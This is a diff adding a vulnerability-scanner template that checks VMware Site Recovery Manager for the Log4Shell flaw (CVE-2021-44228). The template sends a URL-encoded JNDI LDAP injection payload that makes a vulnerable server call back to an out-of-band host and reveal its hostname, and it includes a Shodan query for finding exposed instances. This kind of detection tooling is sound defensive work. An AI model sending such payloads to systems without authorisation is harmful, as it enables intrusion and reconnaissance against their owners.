@@ -1,0 +1,66 @@
+id: vmware-siterecovery-log4j-rce
+
+info:
+  name: VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)
+  author: akincibor
+  severity: critical
+  description: |
+    VMware Site Recovery Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"VMware Site Recovery Manager"
+  tags: cve,cve2021,jndi,log4j,rce,oast,vmware,siterecovery,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - '<title>Error - Site Recovery</title>'
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+
+# digest: 4a0a00473045022033c8ed777b3db8aed8939eba69788766ad654fcf0a4480cfee5469f2e006fd9b02210084545e129ef0220fbc5a670d08c372dba637196aae4f68120d1eb02614651524:922c64590222798bb761d5b6d8e72950
